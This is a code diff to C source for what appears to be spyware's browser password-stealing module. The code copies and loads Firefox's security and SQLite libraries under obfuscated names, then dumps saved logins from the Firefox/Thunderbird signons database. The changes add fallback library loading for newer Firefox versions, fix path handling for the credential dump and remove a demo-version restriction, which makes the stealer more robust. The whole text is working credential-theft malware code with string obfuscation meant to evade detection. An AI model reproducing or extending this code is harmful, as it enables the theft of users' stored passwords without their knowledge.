@@ -18,6 +18,7 @@ extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
 extern char *HM_CompletePath(char *file_name, char *buffer);
 extern WCHAR *GetTBLibPath();
 extern char H4_DUMMY_NAME[];
+extern char *GetDosAsciiName(WCHAR *orig_path);
 
 //Firefox internal SEC structures
 typedef enum SECItemType
@@ -64,6 +65,8 @@ typedef enum SECStatus
 #define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"
 #define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
 #define MOZCRT_LIBRARY_NAME  "05OpELYN.Xyy" //"mozcrt19.dll"
+#define MOZCRTALT_LIBRARY_NAME "05OVLZy9.Xyy" //"mozutils.dll"
+#define MOZCRTALTSEC_LIBRARY_NAME "05O7yVI.Xyy" //"mozglue.dll"
 #define NSSU_LIBRARY_NAME  "199VLZyn.Xyy" //"nssutil3.dll"
 #define PLDS_LIBRARY_NAME  "PyX9x.Xyy" //"plds4.dll"
 #define SOFTN_LIBRARY_NAME "95ML5T1n.Xyy" //"softokn3.dll"
@@ -236,6 +239,17 @@ void FireFoxInitFunc()
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRT_LIBRARY_NAME));
 		HM_CompletePath(DeobStringA(MOZCRT_LIBRARY_NAME), destPath);
 		libcrt = CopyAndLoadDLL(loadPath, destPath);
+		if (!libcrt) {
+			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRTALT_LIBRARY_NAME));
+			HM_CompletePath(DeobStringA(MOZCRTALT_LIBRARY_NAME), destPath);
+			libcrt = CopyAndLoadDLL(loadPath, destPath);
+		}
+		if (!libcrt) {
+			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRTALTSEC_LIBRARY_NAME));
+			HM_CompletePath(DeobStringA(MOZCRTALTSEC_LIBRARY_NAME), destPath);
+			libcrt = CopyAndLoadDLL(loadPath, destPath);
+		}
+
 		if (libcrt)
 			FF_ver_3 = true;
 	}
@@ -335,13 +349,11 @@ void FireFoxUnInitFunc()
 	if ( libnspr4 != NULL )
 		FreeLibrary(libnspr4); 
 
-#ifndef DEMO_VERSION
 	if ( libcrt != NULL ) {
 		FreeLibrary(libcrt);
 		Sleep(100);
 		FreeLibrary(libcrt);
 	}
-#endif
 
 	libnss = NULL;
 	libplc = NULL;
@@ -651,6 +663,7 @@ int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 {
 	struct ffp_entry ffentry;
 	
+	ZeroMemory(&ffentry, sizeof(ffentry));
 	for(int i=0; i<argc; i++){
 		if (!strcmp(azColName[i], "hostname")) {
 			swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
@@ -672,13 +685,18 @@ int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile)
 {
 	void *db;
+	char *ascii_path;
 	CHAR sqlPath[MAX_PATH];
 	int rc;
 
 	if (SQLITE_open == NULL)
 		return 0;
 
-	sprintf_s(sqlPath, MAX_PATH, "%S\\%S", profilePath, signonFile);
+	if (!(ascii_path = GetDosAsciiName(profilePath)))
+		return 0;
+
+	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
+	SAFE_FREE(ascii_path);
 
 	if ((rc = SQLITE_open(sqlPath, &db)))
 		return 0;
@@ -706,7 +724,7 @@ WCHAR *GetFFLibPath()
 		return NULL;
 
 	// Read the firefox path
-	if( FNC(RegQueryValueExA)(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS ) {
+	if( FNC(RegQueryValueExA)(rkey, NULL, 0,  &valueType, (unsigned char*)path, &pathSize) != ERROR_SUCCESS ) {
         FNC(RegCloseKey)(rkey);
         return NULL;
     }
@@ -743,6 +761,9 @@ WCHAR *GetFFProfilePath()
 	WCHAR iniFile[MAX_PATH];
 	WCHAR profilePath[MAX_PATH];
 	DWORD pathSize = MAX_PATH;
+
+	memset(appPath, 0, sizeof(appPath));
+	memset(profilePath, 0, sizeof(profilePath));
 
 	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
 
